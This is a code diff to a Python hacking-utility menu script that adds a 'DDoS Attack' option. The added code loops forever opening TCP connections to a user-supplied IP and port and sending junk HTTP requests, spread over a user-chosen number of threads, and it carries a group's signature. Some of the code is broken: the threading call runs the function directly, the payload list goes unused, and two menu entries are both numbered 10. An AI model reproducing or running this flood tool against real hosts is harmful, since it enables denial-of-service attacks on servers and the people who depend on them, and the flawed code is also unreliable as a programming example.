@@ -1,4 +1,5 @@
 import socket
+import threading
 from time import sleep
 import tkinter as tk
 import webbrowser
@@ -118,7 +119,43 @@ def adminfind():
     else:
         print(Color.RED + "Admin Panel Not Found")
 
-print("1: Find Web IP\n2: Scan Web Port\n3: Web Server Send To Data\n4: My IP\n5: My Find Port\n6: My Computer Name\n7: Custom Port Scan\n8: Admin Page Finding\n9: Who Are We")
+anum = 0
+
+class ddosattack():
+    def ddos(ip = "", port = 0):
+        global anum
+        while True:
+            try:
+                ADDR = (ip, port)
+                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                server.connect(ADDR)
+                data = (("GET / " + "HTTP").encode("utf-8"))
+                [
+                    "DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData",
+                    "DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData",
+                    "DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData",
+                    "DataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataDataData",
+                    "BuBirDDoS'tur:)))))BozkurtTim"
+                ]
+                server.send(data)
+                server.close()
+
+                anum += 1
+                print(anum)
+            except socket.error as e:
+                print("Hata")
+
+
+def startddos():
+    ip = input("Enter IP: ")
+    port = int(input("Enter Port: "))
+    thread = int(input("Enter Threading: "))
+    for i in range(thread):
+        t = threading.Thread(target=ddosattack.ddos(ip, port))
+        t.start()
+        print(i)
+
+print("1: Find Web IP\n2: Scan Web Port\n3: Web Server Send To Data\n4: My IP\n5: My Find Port\n6: My Computer Name\n7: Custom Port Scan\n8: Admin Page Finding\n10: DDoS Attack\n10: Who Are We")
 
 i = int(input("Enter Command: "))
 
@@ -139,6 +176,8 @@ elif i == 7:
 elif i == 8:
     adminfind()
 elif i == 9:
+    startddos()
+elif i == 10:
     open()
 else:
     print("Enter a Valid Number")
